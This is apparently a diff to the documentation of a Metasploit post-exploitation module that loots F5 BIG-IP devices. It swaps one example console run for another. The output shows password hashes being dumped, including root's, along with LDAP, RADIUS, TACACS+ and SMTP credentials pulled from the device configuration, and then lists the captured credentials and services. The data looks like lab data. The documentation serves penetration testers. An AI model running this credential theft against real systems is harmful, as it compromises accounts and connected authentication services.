@@ -87,29 +87,51 @@ View the full module info with the info, or info -d command.
 
 msf6 post(linux/gather/f5_loot_mcp) > run
 
-[*] Gathering users and password hashes from mcp
-[+] admin / $6$Iyzm/x1c$gvlmWSdmj7M/NBUM9DO41LHmC1qDBxM/IMjlUfqLZatVVXHPUvo9/hFDrP1Qg3qHIC0g.O9/dq4TPgDdE3W1z.
-[+] f5hubblelcdadmin / qsVgr34GRROUnQhTSvL2h1Q6NtLE9hpp
-[+] rontest / $6$vVUv0eWT$RGvezgWWLpEa5WfKNumg7b04w2cz87r8TAZ0mxiAvYveDmTRu3h3KUwirAhiFOZ6LcttWxO2XS0MNAhkqaSN11
-[+] root / $6$hWKQCz3U$QE39QIT8ILbdah.k85LMnvKqjq3IIPge3bfM9UAiaUy.leyzHwpjYqQ7jJxSwN1PiFjKB28ofVi6rvenaxh9l/
-[+] msftest10 / $6$SsTj4F5Q$ct0NRCUNGrAkIF7z/XSsUhF5DY1FwDgvGMxh6w09/Zm1jpu0Sj1v8LXRbEtuHlUrtaGMNGcRuU9EZYNjThEar0
-[+] msftest11 / $6$5ls1Hodo$EdiV4XcuutsvYm8Aq6dTPUbxvukli4clH3b.tkLgITrrzOiaC5G8s2zVN/wmFiQ7udVAKUojVkxXuxMqzuWRK0
-[+] msftest12 / $6$e7zpKgrJ$ifN.zbC/vLC3Y2cmecShUqDKt3JEYSruu0Dc73W9pQ0Vv1llCOjOV5gKL3CdxVK2r7LkCYDrH.zQEuMYDIV8s1
-[+] msftest13 / $6$pgYIQtix$H8lIcppGqLH9i5gbKL5QMUpEreAmltXggZBtTgzRMB0iAWDgFsNw157hLg/2Oo9rO0o8HzysnigfFMhXIYoxy1
-[+] msftest14 / $6$gIpu09NZ$I4N6fdzsisopw82SbJJLRf4tv2wpQrQlZaWcD2irlPlWHCzS8jJLEF9vxSQw4oGPebHzCvsZQqANAlubWubiq.
-[+] msftest15 / $6$JPl9tzxV$/kXFRvw4u3vfZNn4HZ1kraxIz./Xj3OQXWYUnFvxUkB.2BzuZvHJHnaT7RyN4HnfNHdY1pLhvzSm9fvVJX6fs.
-[+] rontest321 / $6$T2mT4PeYSuyg/hSr$y/rN9tol5t1fRxTBqFVtxLzRfUBXt16yNahqYTaVVZa3PITfoAKBnuzqvwBT77qNBV4JjgwdhzqmsMk78bo6d0
-[+] Users and password hashes stored in /home/ron/.msf4/loot/20221123110850_default_10.0.0.162_f5.passwords_484560.txt
-[*] Gathering upstream passwords from mcp
+[*] Gathering users and password hashes from MCP
+[+] admin:$6$Rvvp3001$4fGV5Pb2gf9rbiV78KCbdbGhfdwsFL0Kt1BR3IIytgb.2aXCpJG0xC2.JDzRvpAjTbIrvBt7YHi2j0mh.ww9i1
+[+] f5hubblelcdadmin:yJXc4uXccfpSrdxcvZIjYT7clhNMUPJG
+[+] root:$6$leOcJhIk$pY9xDy1lvacvJzIYM0RCgJ3laTppP2jFjsNek1AbFddYQWEuFMek51K5cyg5BU3pYMhTGQoWgDr0gocIIyMoc1
+[*] Gathering upstream passwords from MCP
 [*] Trying to fetch LDAP / Active Directory configuration
+[+] dc.msflab.local:636   - ldaps: 'smcintyre:Password1!'
 [*] Trying to fetch Radius configuration
+[+] 192.168.159.12:1812   - radius: ':radiussecret'
+[+] 192.168.159.13:1812   - radius: ':radiusbackup'
 [*] Trying to fetch TACACS+ configuration
+[+] 192.168.159.200:49    - tacacs+: ':tacaspassword'
 [*] Trying to fetch SMTP configuration
-[*] No SMTP password found
-[+] LDAP: admin / myadpassword (server(s): ad.example.org)
-[+] Radius secret: secret2 (server: myradiustest2.example.org)
-[+] Radius secret: myradiussecret (server: myradiustest.example.org)
-[+] TACACS+ secret: mytacacspassword (server(s): mytacacsserver.example.org, mytacacsserver2.example.org)
-[+] Passwords stored in /home/ron/.msf4/loot/20221123110852_default_10.0.0.162_f5.service.passw_644261.txt
+[+] 192.168.159.128:25    - smtp: 'alice:secretpassword'
 [*] Post module execution completed
+```
+
+The module logs information to the Metasploit database (when connected):
+
+```
+msf6 post(linux/gather/f5_loot_mcp) > creds
+Credentials
+===========
+
+host             origin           service            public            private                                                                                              realm  private_type        JtR Format
+----             ------           -------            ------            -------                                                                                              -----  ------------        ----------
+                 192.168.159.119                     smcintyre         Password1!                                                                                                  Password            
+                 192.168.159.119                     admin             $6$Rvvp3001$4fGV5Pb2gf9rbiV78KCbdbGhfdwsFL0Kt1BR3IIytgb.2aXCpJG0xC2.JDzRvpAjTbIrvBt7YHi (TRUNCATED)         Nonreplayable hash  sha512,crypt
+                 192.168.159.119                     f5hubblelcdadmin  yJXc4uXccfpSrdxcvZIjYT7clhNMUPJG                                                                            Nonreplayable hash  
+                 192.168.159.119                     root              $6$leOcJhIk$pY9xDy1lvacvJzIYM0RCgJ3laTppP2jFjsNek1AbFddYQWEuFMek51K5cyg5BU3pYMhTGQoWgDr (TRUNCATED)         Nonreplayable hash  sha512,crypt
+192.168.159.12   192.168.159.119  1812/tcp (radius)                    radiussecret                                                                                                Password            
+192.168.159.13   192.168.159.119  1812/tcp (radius)                    radiusbackup                                                                                                Password            
+192.168.159.128  192.168.159.119  25/tcp (smtp)      alice             secretpassword                                                                                              Password            
+192.168.159.200  192.168.159.119  49/tcp (tacacs+)                     tacaspassword                                                                                               Password            
+
+msf6 post(linux/gather/f5_loot_mcp) > services
+Services
+========
+
+host             port  proto  name     state  info
+----             ----  -----  ----     -----  ----
+192.168.159.12   1812  tcp    radius   open
+192.168.159.13   1812  tcp    radius   open
+192.168.159.128  25    tcp    smtp     open
+192.168.159.200  49    tcp    tacacs+  open
+
+msf6 post(linux/gather/f5_loot_mcp) >
 ```
